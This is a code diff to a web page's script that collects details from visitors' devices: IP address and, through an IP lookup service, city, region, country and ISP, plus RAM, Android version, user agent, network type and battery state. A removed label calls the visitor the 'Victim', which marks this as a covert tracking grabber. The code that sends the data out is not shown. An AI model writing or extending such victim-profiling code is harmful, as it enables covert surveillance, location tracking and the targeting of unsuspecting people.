@@ -202,36 +202,43 @@
     }
 
     async function gatherDeviceInfo() {
-      let ip;
-      try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        ip = data.ip;
-      } catch (error) {
-        ip = 'N/A';
-      }
+  let ipInfo;
+  try {
+    const response = await fetch('http://ip-api.com/json');
+    ipInfo = await response.json();
+  } catch (error) {
+    ipInfo = { query: 'N/A', city: 'N/A', regionName: 'N/A', country: 'N/A', isp: 'N/A' };
+  }
 
-      let batteryInfo = await navigator.getBattery();
-      const batteryLevel = batteryInfo.level * 100 + '%';
-      const isBatteryCharging = batteryInfo.charging ? 'Yes' : 'No';
+  const memory = navigator.deviceMemory || 'N/A';
+  const androidVersion = navigator.userAgent.match(/Android\s([0-9.]*)/)[1] || 'N/A';
+  const mobileName = navigator.userAgent || 'N/A';
 
-      const deviceInfo = `
+  // Check network type
+  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  const connectionType = connection ? connection.effectiveType : 'N/A';
+  const networkStatus = connectionType === 'wifi' ? 'WiFi' :
+                        (connectionType === 'cellular' ? 'Mobile Data' :
+                        (connectionType === 'unknown' ? 'WiFi or Unknown' : 'Unknown'));
+
+  let batteryInfo = await navigator.getBattery();
+  const batteryLevel = batteryInfo.level * 100 + '%';
+  const isBatteryCharging = batteryInfo.charging ? 'Yes' : 'No';
+
+  const deviceInfo = `
 Information
-IP: ${ip} | Time: ${new Date().toLocaleTimeString()}
-Date In Victim's Device: ${new Date().toLocaleDateString()}
-Device Information
-User Agent: ${navigator.userAgent}
+IP: ${ipInfo.query} | Location: ${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}
+ISP: ${ipInfo.isp}
+RAM: ${memory} GB
+Android Version: ${androidVersion}
+Mobile Name: ${mobileName}
 Network Information
-Type: ${navigator.connection.effectiveType}
-RTT: ${navigator.connection.rtt}
-Save Data: ${navigator.connection.saveData}
-Downlink: ${navigator.connection.downlink}
-Downlink Max: ${navigator.connection.downlinkMax}
+Network Type: ${networkStatus}
 Battery Information
 Battery Level: ${batteryLevel}
 Is Battery Charging: ${isBatteryCharging}
 `;
-      return deviceInfo;
+  return deviceInfo;
     }
   </script>
 </body>
